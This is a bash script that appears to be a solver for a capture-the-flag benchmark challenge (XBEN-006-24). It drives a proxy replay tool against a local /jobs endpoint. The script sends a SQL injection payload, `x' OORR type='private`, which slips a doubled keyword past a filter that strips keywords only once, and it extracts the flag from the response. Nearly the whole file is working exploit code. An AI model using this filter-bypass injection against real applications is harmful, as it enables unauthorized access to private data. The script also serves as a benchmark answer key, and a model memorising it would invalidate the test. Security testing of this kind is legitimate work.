#!/usr/bin/env bash
# XBEN-006-24 — SQL injection behind a keyword-stripping filter. Proxy-mode twin.
# The /jobs filter strips keywords once, non-recursively, so a doubled keyword
# (`OORR` -> `OR`) survives; the quote closes the string and `private` jobs —
# one holding the flag — are returned without being asked for by name.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben006p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/jobs' \
  --set 'header.content-type=application/json' \
  --set "json.job_type=x' OORR type='private" \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
